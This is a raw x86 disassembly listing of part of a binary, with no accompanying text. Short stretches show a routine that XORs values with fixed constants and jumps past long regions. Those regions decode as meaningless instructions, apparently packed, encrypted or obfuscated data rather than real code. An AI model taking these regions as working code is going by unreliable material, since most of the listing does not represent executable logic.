  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x422548
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [edi+ebx*1+0x19],0xffffff8d
  409ce0:	jo     0x409caf
  409ce2:	cmp    DWORD PTR [eax],ebx
  409ce4:	sbb    BYTE PTR [esi+0x67181812],bl
  409cea:	(bad)  
  409cec:	cs ja  0x409d0e
  409cef:	lds    edi,FWORD PTR [edi-0x46515f72]
  409cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cf6:	push   ecx
  409cf7:	and    DWORD PTR [ebx+0x25],0xffffffd9
  409cfb:	inc    ebp
  409cfc:	inc    esi
  409cfd:	push   ss
  409cfe:	mov    eax,0x140a1de3
  409d03:	add    DWORD PTR ds:0xd293e708,eax
  409d09:	mov    eax,0x26a9d141
  409d0e:	xor    bl,dl
  409d10:	push   es
  409d11:	in     al,dx
  409d12:	inc    edi
  409d13:	sbb    DWORD PTR [ebx],edx
  409d15:	xchg   ebx,eax
  409d16:	out    dx,al
  409d17:	mov    esi,0x2b0f74e3
  409d1c:	jae    0x409d47
  409d1e:	dec    esi
  409d1f:	out    dx,al
  409d20:	ret    
  409d21:	cmp    al,ch
  409d23:	adc    eax,0x9a24d9a7
  409d28:	push   ds
  409d29:	aad    0x7
  409d2b:	sub    DWORD PTR [edi-0x4989b2b],ebp
  409d31:	popf   
  409d32:	inc    ebp
  409d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d34:	out    dx,eax
  409d35:	or     dh,al
  409d37:	mov    ah,0x5d
  409d39:	inc    edx
  409d3a:	lods   eax,DWORD PTR ds:[esi]
  409d3b:	xor    DWORD PTR [edi-0x20dc0005],edx
  409d41:	jecxz  0x409da0
  409d43:	pop    es
  409d44:	and    dh,dh
  409d46:	mov    DWORD PTR [esi+0xddfd55],ebx
  409d4c:	ffree  st(3)
  409d4e:	call   FWORD PTR [edi-0x6b2c948]
  409d54:	inc    edx
  409d55:	fst    QWORD PTR [edi]
  409d57:	sub    al,BYTE PTR [edx+0x29]
  409d5a:	inc    ebp
  409d5b:	iret   
  409d5c:	mov    edi,0x66d69d7c
  409d61:	call   0x1a089d6
  409d66:	into   
  409d67:	mov    eax,DWORD PTR [ecx+ecx*4]
  409d6a:	mov    ds:0x6deada4e,eax
  409d6f:	in     al,0x90
  409d71:	sbb    ebp,DWORD PTR [ebx+0x7e7b1805]
  409d77:	push   eax
  409d78:	rol    BYTE PTR [edx-0x45],1
  409d7b:	out    dx,al
  409d7c:	cli    
  409d7d:	pop    edi
  409d7e:	and    eax,0xfcb22c7d
  409d83:	inc    edi
  409d84:	mov    ah,0x28
  409d86:	es test al,0x12
  409d89:	stos   BYTE PTR es:[edi],al
  409d8a:	sub    BYTE PTR [edx-0x5d2bf621],dl
  409d90:	mov    bh,0x24
  409d92:	shr    BYTE PTR [esi],cl
  409d94:	sbb    ecx,DWORD PTR [edx-0x43b97282]
  409d9a:	into   
  409d9b:	in     eax,0xdc
  409d9d:	aas    
  409d9e:	cdq    
  409d9f:	xlat   BYTE PTR ds:[ebx]
  409da0:	jl     0x409df4
  409da2:	sbb    BYTE PTR [edx+edi*2+0x5],0x2a
  409da7:	pop    ebp
  409da8:	loop   0x409d3a
  409daa:	pop    edx
  409dab:	shr    DWORD PTR [eax-0x2e],cl
  409dae:	(bad)  
  409daf:	jo     0x409de8
  409db1:	xchg   ebx,eax
  409db2:	push   0xe955ad8b
  409db7:	pop    esi
  409db8:	cmp    DWORD PTR [ebx-0x2bb8d0e6],edi
  409dbe:	cmc    
  409dbf:	xchg   esi,eax
  409dc0:	adc    edi,ebp
  409dc2:	ret    
  409dc3:	jmp    0x7b0d:0x7301c373
  409dca:	fs shl dh,1
  409dcd:	test   eax,0x4dc8a5c7
  409dd2:	dec    ebp
  409dd3:	mov    bl,0xe8
  409dd5:	pusha  
  409dd6:	je     0x409da8
  409dd8:	pop    ebx
  409dd9:	fisttp DWORD PTR [edi]
  409ddb:	dec    edx
  409ddc:	arpl   WORD PTR [esi-0x6],cx
  409ddf:	jl     0x409e2d
  409de1:	or     esp,DWORD PTR [ebx]
  409de3:	xor    esp,DWORD PTR [ebx-0x17ed005b]
  409de9:	retf   
  409dea:	mov    ebx,0x5c7ae09b
  409def:	or     DWORD PTR [ebx+0x5dfd75eb],edx
  409df5:	xlat   BYTE PTR ds:[ebx]
  409df6:	pop    edx
  409df7:	and    al,0x91
  409df9:	js     0x409e0c
  409dfb:	xchg   ebp,eax
  409dfc:	fwait
  409dfd:	sbb    DWORD PTR [ebp+eax*4+0x41623bfc],ebx
  409e04:	pushw  ds
  409e06:	mov    DWORD PTR [esi+0x73],edi
  409e09:	adc    bl,BYTE PTR [edx+0x445f3bb2]
  409e0f:	add    eax,0xabb78bf2
  409e14:	loopne 0x409de6
  409e16:	in     eax,dx
  409e17:	jne    0x409d9b
  409e19:	or     al,0x50
  409e1b:	popa   
  409e1c:	jl     0x409e49
  409e1e:	or     BYTE PTR ds:0x3c697acb,bl
  409e24:	enter  0xf27c,0xb5
  409e28:	inc    eax
  409e29:	rol    BYTE PTR [ecx+0x70],1
  409e2c:	outs   dx,DWORD PTR ds:[esi]
  409e2d:	in     al,dx
  409e2e:	loop   0x409e73
  409e30:	sbb    eax,0xc5b1d7bd
  409e35:	and    ah,bl
  409e37:	sub    al,0x51
  409e39:	jg     0x409de1
  409e3b:	add    al,0xa9
  409e3d:	fwait
  409e3e:	or     eax,0xb6f63554
  409e43:	shl    DWORD PTR [ecx+ebp*1+0x758fc3d3],0x47
  409e4b:	dec    ebx
  409e4c:	outs   dx,DWORD PTR ds:[esi]
  409e4d:	or     DWORD PTR ds:0xe554f2b3,esp
  409e53:	hlt    
  409e54:	loopne 0x409df3
  409e56:	xor    DWORD PTR [edi],0x3aa9ff1
  409e5c:	jecxz  0x409e7b
  409e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e5f:	mov    cl,BYTE PTR [esi-0x37]
  409e62:	aad    0xdd
  409e64:	pop    DWORD PTR [ebp+0x1f946d30]
  409e6a:	jge    0x409e92
  409e6c:	pop    ecx
  409e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e6e:	mov    edi,0x3690fd31
  409e73:	pop    ss
  409e74:	jb     0x409e20
  409e76:	cmp    eax,esi
  409e78:	mov    ds:0x851baf98,eax
  409e7d:	mov    ds:0x56fd783a,al
  409e82:	and    al,0x7a
  409e84:	scas   al,BYTE PTR es:[edi]
  409e85:	mov    al,0x96
  409e87:	(bad)  
  409e88:	jns    0x409e39
  409e8a:	out    0x54,al
  409e8c:	pop    ss
  409e8d:	ret    
  409e8e:	int    0xb4
  409e90:	das    
  409e91:	in     eax,dx
  409e92:	ins    DWORD PTR es:[edi],dx
  409e93:	call   0xb69c:0xec6a02cb
  409e9a:	add    al,0xbd
  409e9c:	sub    al,0x5a
  409e9e:	pop    ds
  409e9f:	repz fwait
  409ea1:	sbb    dh,BYTE PTR ds:0x20785c0e
  409ea7:	pushf  
  409ea8:	es cmc 
  409eaa:	jno    0x409e76
  409eac:	ds jecxz 0x409f25
  409eaf:	sbb    BYTE PTR [edx+0xc],ch
  409eb2:	sub    al,0x1c
  409eb4:	mov    ds:0x5e47417a,eax
  409eb9:	pop    ds
  409eba:	mov    ecx,0xa1eca0b3
  409ebf:	repz ds adc eax,ebx
  409ec3:	jl     0x409e81
  409ec5:	hlt    
  409ec6:	call   0x55a3f056
  409ecb:	mov    dh,0xde
  409ecd:	fst    DWORD PTR [esi-0x44]
  409ed0:	cld    
  409ed1:	mov    esi,0x3343b5dd
  409ed6:	sub    al,0x1d
  409ed8:	or     eax,0x89f2c869
  409edd:	cmc    
  409ede:	pop    eax
  409edf:	fld    TBYTE PTR [edx-0x48]
  409ee2:	lods   eax,DWORD PTR ds:[esi]
  409ee3:	arpl   ax,cx
  409ee5:	stos   BYTE PTR es:[edi],al
  409ee6:	pop    es
  409ee7:	push   ebp
  409ee8:	mov    dl,0x79
  409eea:	add    al,bh
  409eec:	imul   edi,DWORD PTR [edi],0xebb1a290
  409ef2:	nop
  409ef3:	sar    BYTE PTR [ebx-0x43],cl
  409ef6:	dec    esi
  409ef7:	(bad)  
  409ef8:	je     0x409efd
  409efa:	xchg   esp,eax
  409efb:	aam    0x47
  409efd:	and    eax,0xb669b402
  409f02:	mov    ch,0x36
  409f04:	ret    0x1992
  409f07:	pop    esi
  409f08:	out    dx,eax
  409f09:	rcr    BYTE PTR [edx+0x3d],cl
  409f0c:	lea    esi,[ebx-0x19]
  409f0f:	(bad)  
  409f10:	cli    
  409f11:	cmc    
  409f12:	mov    edi,0xeaf71601
  409f17:	(bad)  [eax]
  409f19:	xor    BYTE PTR [edi+0x72ac3d71],dh
  409f1f:	out    0x6f,eax
  409f21:	and    BYTE PTR [ecx-0x26],al
  409f24:	xor    DWORD PTR [eax-0x48c787bd],edx
  409f2a:	sub    BYTE PTR ds:[edx-0x319d330b],ah
  409f31:	retf   
  409f32:	mov    ch,0x20
  409f34:	push   0xfffffffc
  409f36:	hlt    
  409f37:	sbb    ebx,DWORD PTR [esi]
  409f39:	xchg   esi,eax
  409f3a:	inc    ebp
  409f3b:	mov    bl,0xbf
  409f3d:	add    DWORD PTR [ecx+0x53e801ef],esp
  409f43:	jbe    0x409ec9
  409f45:	cwde   
  409f46:	stos   DWORD PTR es:[edi],eax
  409f47:	sub    esi,DWORD PTR [edx+0x36911a2d]
  409f4d:	push   edi
  409f4e:	jmp    0x38f3:0x22eef350
  409f55:	or     DWORD PTR [edx+0x676441b1],ebx
  409f5b:	jp     0x409f25
  409f5d:	outs   dx,DWORD PTR ds:[esi]
  409f5e:	sbb    ebx,DWORD PTR [eax-0x18236c37]
  409f64:	test   DWORD PTR [edx+edi*2],ebx
  409f67:	mov    ebx,0xf02538bb
  409f6c:	jle    0x409fd3
  409f6e:	ins    BYTE PTR es:[edi],dx
  409f6f:	rcr    DWORD PTR [edx+0x610dcc3e],0x4d
  409f76:	add    BYTE PTR [edi+ebx*1],cl
  409f79:	mov    ch,0x42
  409f7b:	(bad)  
  409f7c:	shl    BYTE PTR [ecx+0x35],1
  409f7f:	pop    edx
  409f80:	sbb    al,0x15
  409f82:	dec    edi
  409f83:	or     BYTE PTR [esi],0xe5
  409f86:	das    
  409f87:	xor    DWORD PTR [edi-0x6c741560],esp
  409f8d:	retf   0x6f49
  409f90:	icebp  
  409f91:	mov    ebx,0x95fdcd8e
  409f96:	stc    
  409f97:	xor    edx,DWORD PTR [eax+ebp*1]
  409f9a:	in     al,dx
  409f9b:	mov    ?,esp
  409f9d:	imul   esi,DWORD PTR [edx],0xb6e381e1
  409fa3:	fisub  DWORD PTR [ebx+0x6]
  409fa6:	bts    ebx,0xde
  409faa:	inc    esp
  409fab:	in     eax,0x95
  409fad:	ins    DWORD PTR es:[edi],dx
  409fae:	loop   0x409ff9
  409fb0:	and    eax,0x3a709a4d
  409fb5:	pop    ecx
  409fb6:	mov    eax,0xc4bde2a2
  409fbb:	repz mov bh,0x38
  409fbe:	mov    ch,BYTE PTR [ebx]
  409fc0:	inc    esi
  409fc1:	jae    0x409f95
  409fc3:	xchg   edi,eax
  409fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fc5:	cmc    
  409fc6:	pop    es
  409fc7:	push   ss
  409fc8:	addr16 cmp al,0x19
  409fcb:	add    DWORD PTR [edi-0x35],edx
  409fce:	push   esi
  409fcf:	cmp    cl,bl
  409fd1:	push   ebx
  409fd2:	std    
  409fd3:	int3   
  409fd4:	nop
  409fd5:	jg     0x409f7d
  409fd7:	lahf   
  409fd8:	in     al,0xe7
  409fda:	sti    
  409fdb:	aad    0x0
  409fdd:	int3   
  409fde:	in     al,0x37
  409fe0:	fsubr  st,st(6)
  409fe2:	aam    0xb3
  409fe4:	inc    ebx
  409fe5:	ret    0x2a09
  409fe8:	pop    edi
  409fe9:	cmc    
  409fea:	jle    0x40a029
  409fec:	mov    ss,WORD PTR [eax+ebp*8]
  409fef:	or     BYTE PTR [ebp-0x40],cl
  409ff2:	sub    al,0x8b
  409ff4:	push   esi
  409ff5:	xchg   esp,eax
  409ff6:	fs xchg edi,eax
  409ff8:	(bad)  
  409ff9:	lds    edx,FWORD PTR [esi+ebx*2-0x35]
  409ffd:	scas   eax,DWORD PTR es:[edi]
  409ffe:	lods   eax,DWORD PTR ds:[esi]
  409fff:	or     dh,ch
  40a001:	div    BYTE PTR [ebx-0x72682a8f]
  40a007:	add    DWORD PTR [ecx],esi
  40a009:	jae    0x40a07c
  40a00b:	xchg   esp,eax
  40a00c:	cli    
  40a00d:	sub    DWORD PTR [esi-0x72],ecx
  40a010:	mov    ch,0xed
  40a012:	fisttp DWORD PTR [edx-0x78fd194b]
  40a018:	and    cl,dh
  40a01a:	imul   eax,DWORD PTR [esi+edi*4-0x3e],0x0
  40a01f:	daa    
  40a020:	fmul   st(3),st
  40a022:	add    ecx,DWORD PTR [ecx-0x6f]
  40a025:	xor    ebp,0x6f
  40a028:	sub    dh,BYTE PTR [esi-0x6b]
  40a02b:	ins    DWORD PTR es:[edi],dx
  40a02c:	mov    bh,0xc5
  40a02e:	and    dl,ah
  40a030:	jmp    0x40a087
  40a032:	push   esp
  40a033:	push   ebp
  40a034:	int3   
  40a035:	aas    
  40a036:	(bad)  
  40a038:	imul   edi,DWORD PTR [edi+0x30],0x5613cda6
  40a03f:	imul   esi,DWORD PTR [edi],0x86967fbd
  40a045:	pop    ebp
  40a046:	jns    0x40a0a7
  40a048:	loope  0x40a02c
  40a04a:	dec    ecx
  40a04b:	push   edi
  40a04c:	pusha  
  40a04d:	loope  0x409ffc
  40a04f:	(bad)  
  40a050:	jae    0x40a088
  40a052:	int    0xf3
  40a054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a055:	and    al,BYTE PTR [edi]
  40a057:	mov    dl,BYTE PTR [bp+di]
  40a05a:	dec    esi
  40a05b:	pop    edx
  40a05c:	imul   edi,ecx,0xffffffc8
  40a05f:	stc    
  40a060:	inc    ebx
  40a061:	and    bh,ch
  40a063:	mov    ch,0xfa
  40a065:	icebp  
  40a066:	imul   ecx,esi,0xdf75d19e
  40a06c:	inc    ebp
  40a06d:	push   ebx
  40a06e:	popf   
  40a06f:	sub    eax,0xbe21a3bc
  40a074:	xchg   ebx,eax
  40a075:	cmp    eax,0x5e86a7eb
  40a07a:	cs sub eax,0xe078121e
  40a080:	or     dl,BYTE PTR [eax-0x2413251c]
  40a086:	jns    0x40a067
  40a088:	push   ss
  40a089:	out    dx,eax
  40a08a:	mov    WORD PTR [edi],gs
  40a08c:	ins    BYTE PTR es:[edi],dx
  40a08d:	and    ebp,DWORD PTR [ecx]
  40a08f:	xchg   ebp,esp
  40a091:	daa    
  40a092:	xor    BYTE PTR [edi],ch
  40a094:	cmp    ebp,DWORD PTR [ebp+0x6b61939]
  40a09a:	dec    eax
  40a09b:	sbb    BYTE PTR [ebx+0x1fb96afb],dh
  40a0a1:	push   ds
  40a0a2:	mov    edi,0x5d99bb5
  40a0a7:	cli    
  40a0a8:	inc    esi
  40a0a9:	xor    eax,0x8b047e8b
  40a0ae:	jge    0x40a0c4
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	xor    esp,DWORD PTR [edi+0x3352705b]
  40a12e:	sbb    BYTE PTR [eax],bl
  40a130:	sahf   
  40a131:	adc    bl,BYTE PTR [eax]
  40a133:	sbb    BYTE PTR [edi+0x23],dl
  40a136:	and    eax,0x6f456b2e
  40a13b:	call   0x79d1:0x1dc849e1
  40a142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a143:	icebp  
  40a144:	daa    
  40a145:	pop    es
  40a146:	pop    ecx
  40a147:	mov    dl,dh
  40a149:	add    bl,dl
  40a14b:	jae    0x40a164
  40a14d:	pop    ecx
  40a14e:	pop    es
  40a14f:	push   eax
  40a150:	adc    ah,BYTE PTR [edx+0x24]
  40a153:	push   ds
  40a154:	test   BYTE PTR [ebx+0x4965772f],dh
  40a15a:	xor    eax,0xb1b4e19a
  40a15f:	rol    edx,1
  40a161:	stos   DWORD PTR es:[edi],eax
  40a162:	sub    eax,0xd15b155d
  40a167:	cli    
  40a168:	xor    eax,0x539fc990
  40a16d:	push   0xffffffda
  40a16f:	leave  
  40a170:	not    DWORD PTR [ebx-0xc4a8945]
  40a176:	mov    DWORD PTR [esi*4-0x778884a9],ebp
  40a17d:	rol    BYTE PTR [edx],0xbd
  40a180:	int    0xbc
  40a182:	(bad)  
  40a183:	in     al,dx
  40a184:	mov    edi,0xe8b66751
  40a189:	loope  0x40a1ae
  40a18b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a18c:	mov    esi,0x91180fc0
  40a191:	loope  0x40a1c9
  40a193:	cld    
  40a194:	dec    ecx
  40a195:	mov    bh,0xc2
  40a197:	data16 cmp al,0x4f
  40a19a:	repz xlat BYTE PTR ds:[ebx]
  40a19c:	sub    al,0x35
  40a19e:	je     0x40a161
  40a1a0:	jge    0x40a160
  40a1a2:	jmp    0x68a081c8
  40a1a7:	mov    ds,WORD PTR [ebx-0x2feb3c49]
  40a1ad:	sbb    al,0xfb
  40a1af:	ret    0xb159
  40a1b2:	jb     0x40a145
  40a1b4:	mov    dl,0x91
  40a1b6:	popf   
  40a1b7:	outs   dx,BYTE PTR ds:[esi]
  40a1b8:	pop    eax
  40a1b9:	div    BYTE PTR [ebx]
  40a1bb:	dec    eax
  40a1bc:	test   eax,0x28dc43e6
  40a1c1:	add    eax,0xd05266c8
  40a1c6:	mov    bh,0xd4
  40a1c8:	retf   0xd924
  40a1cb:	inc    edx
  40a1cc:	sub    eax,edx
  40a1ce:	and    BYTE PTR [edx-0x50674908],dl
  40a1d4:	jno    0x40a177
  40a1d6:	(bad)  
  40a1d7:	lock jl 0x40a1a4
  40a1da:	std    
  40a1db:	in     eax,dx
  40a1dc:	lock ficomp WORD PTR [edx-0x5a4c1afe]
  40a1e3:	dec    edi
  40a1e4:	pop    ebp
  40a1e5:	mov    bh,0xe0
  40a1e7:	inc    eax
  40a1e8:	je     0x40a25f
  40a1ea:	mov    cl,0xb9
  40a1ec:	push   ss
  40a1ed:	xchg   ecx,eax
  40a1ee:	pop    ds
  40a1ef:	test   BYTE PTR [ecx-0x48120d1f],0x76
  40a1f6:	inc    eax
  40a1f7:	push   eax
  40a1f8:	cs sbb eax,ebp
  40a1fb:	jmp    0xce4:0xf2f4cd19
  40a202:	cmp    ecx,ecx
  40a204:	jnp    0x40a206
  40a206:	sub    eax,0x86a12f2a
  40a20b:	mov    ds:0x7022b819,eax
  40a210:	retf   
  40a211:	sub    bh,BYTE PTR [eax+0xc]
  40a214:	add    ch,cl
  40a216:	scas   al,BYTE PTR es:[edi]
  40a217:	shr    DWORD PTR [eax+eiz*2-0x49cedbcc],cl
  40a21e:	inc    ecx
  40a21f:	adc    al,0xae
  40a221:	xor    al,0x17
  40a223:	fsubr  DWORD PTR [edx]
  40a225:	loope  0x40a24c
  40a227:	mov    edi,0xdda447ca
  40a22c:	inc    esi
  40a22d:	popf   
  40a22e:	jmp    0x40a1d1
  40a230:	or     ebx,0x30505693
  40a236:	mov    ds:0x94f39777,al
  40a23b:	ret    0x79c6
  40a23e:	push   0xf
  40a240:	aam    0x28
  40a242:	and    ebp,ebp
  40a244:	lahf   
  40a245:	gs push edi
  40a247:	xor    al,0x4e
  40a249:	addr16 jno 0x40a20f
  40a24c:	cmp    esp,DWORD PTR [edx+0x69]
  40a24f:	fwait
  40a250:	hlt    
  40a251:	cmp    al,0x87
  40a253:	ss call 0xd160:0x84687e82
  40a25b:	lods   al,BYTE PTR fs:[esi]
  40a25d:	rcr    DWORD PTR [edx+0x643d8338],0x40
  40a264:	add    esi,DWORD PTR [edi-0x78]
  40a267:	shr    DWORD PTR ds:0x3369047d,0x67
  40a26e:	adc    eax,0xd07b510a
  40a273:	fld    DWORD PTR [eax-0x4e68433b]
  40a279:	inc    edi
  40a27a:	xor    dh,BYTE PTR [edx-0x34]
  40a27d:	pop    ss
  40a27e:	ja     0x40a27c
  40a280:	mov    edi,0x2d496499
  40a285:	out    0x67,eax
  40a287:	inc    edi
  40a288:	in     eax,0x22
  40a28a:	and    ah,dl
  40a28c:	or     al,al
  40a28e:	loope  0x40a29f
  40a290:	xchg   edi,eax
  40a291:	aam    0x1a
  40a293:	outs   dx,BYTE PTR ds:[esi]
  40a294:	mov    WORD PTR gs:[ebp+eax*1+0x2a],ss
  40a299:	inc    esi
  40a29a:	xor    esi,DWORD PTR [ebp-0x3d]
  40a29d:	pop    ecx
  40a29e:	(bad)  
  40a29f:	jmp    0x8efa:0xf64190ec
  40a2a6:	or     dh,BYTE PTR [esi]
  40a2a8:	jg     0x40a272
  40a2aa:	retf   0x175a
  40a2ad:	lahf   
  40a2ae:	popf   
  40a2af:	or     BYTE PTR [edi],al
  40a2b1:	add    BYTE PTR [ebx-0x3a5a17d6],cl
  40a2b7:	fistp  WORD PTR [ebp+ebx*1+0x123d32bf]
  40a2be:	jo     0x40a2d4
  40a2c0:	ja     0x40a32c
  40a2c2:	es or  eax,0x7b90e490
  40a2c8:	out    dx,al
  40a2c9:	ins    DWORD PTR es:[edi],dx
  40a2ca:	call   0x90b24045
  40a2cf:	sub    DWORD PTR [eax+ebx*1+0x3bffb33d],eax
  40a2d6:	fwait
  40a2d7:	mov    WORD PTR [edi],ss
  40a2d9:	mov    BYTE PTR [edi],bh
  40a2db:	mov    cl,0xa0
  40a2dd:	ds retf 0x322c
  40a2e1:	or     eax,0xd41767bf
  40a2e6:	and    esp,DWORD PTR [edx-0x73a6a346]
  40a2ec:	jmp    0x40a293
  40a2ee:	mov    cl,0xc8
  40a2f0:	jbe    0x40a2c3
  40a2f2:	loop   0x40a35f
  40a2f4:	popa   
  40a2f5:	rol    DWORD PTR [eax-0xf],cl
  40a2f8:	mov    dh,0xc7
  40a2fa:	adc    ah,BYTE PTR [ecx+0x217fdf20]
  40a300:	adc    DWORD PTR [edx+0x34],0x2478ae4a
  40a307:	stos   DWORD PTR es:[edi],eax
  40a308:	adc    eax,0xb89459d4
  40a30d:	sub    al,0x44
  40a30f:	sub    BYTE PTR [esi-0x5b],al
  40a312:	hlt    
  40a313:	out    0xce,eax
  40a315:	cwde   
  40a316:	xlat   BYTE PTR ds:[ebx]
  40a317:	lock sbb ah,BYTE PTR cs:[edi-0x5aec8bb0]
  40a31f:	aad    0xca
  40a321:	dec    edi
  40a322:	push   ss
  40a323:	or     BYTE PTR [ecx+0x8],0xbf
  40a327:	dec    ebp
  40a328:	add    ecx,DWORD PTR [ebx+0xb]
  40a32b:	clc    
  40a32c:	or     ebx,DWORD PTR [esi-0x11511b18]
  40a332:	push   ds
  40a333:	loope  0x40a349
  40a335:	(bad)  
  40a336:	jbe    0x40a2c1
  40a338:	pop    eax
  40a339:	pop    ecx
  40a33a:	jne    0x40a307
  40a33c:	(bad)  
  40a33d:	and    DWORD PTR [edi],ebx
  40a33f:	cmp    ecx,ebp
  40a341:	sub    eax,0x3e4fb2c7
  40a346:	leave  
  40a347:	dec    eax
  40a348:	cli    
  40a349:	dec    eax
  40a34a:	sub    esp,ecx
  40a34c:	push   edi
  40a34d:	mov    esi,0xbea6df40
  40a352:	mov    dh,0xdc
  40a354:	cdq    
  40a355:	adc    DWORD PTR [edx],esp
  40a357:	mov    ebp,DWORD PTR [esi-0x3d]
  40a35a:	push   es
  40a35b:	sub    eax,0xf656e212
  40a360:	xor    al,0xbc
  40a362:	sbb    eax,ecx
  40a364:	mov    esi,0x4e7c2112
  40a369:	ins    DWORD PTR es:[edi],dx
  40a36a:	int3   
  40a36b:	mov    cl,0xc0
  40a36d:	add    bh,BYTE PTR [ebx]
  40a36f:	scas   eax,DWORD PTR es:[edi]
  40a370:	jecxz  0x40a33e
  40a372:	popf   
  40a373:	imul   esp,DWORD PTR [edx-0x6],0xffffff9c
  40a377:	inc    eax
  40a378:	mov    bl,0x8c
  40a37a:	push   ebx
  40a37b:	mov    esi,0xabec57bc
  40a380:	into   
  40a381:	stos   DWORD PTR es:[edi],eax
  40a382:	add    BYTE PTR [esi],dl
  40a384:	int3   
  40a385:	test   BYTE PTR [eax+0x7180813],cl
  40a38b:	mov    cl,0x29
  40a38d:	mov    bl,0x32
  40a38f:	ss inc eax
  40a391:	repnz mov ds:0x92529834,eax
  40a397:	fbld   TBYTE PTR [ecx]
  40a399:	repz into 
  40a39b:	pop    ecx
  40a39c:	ja     0x40a3f1
  40a39e:	(bad)  
  40a39f:	in     eax,dx
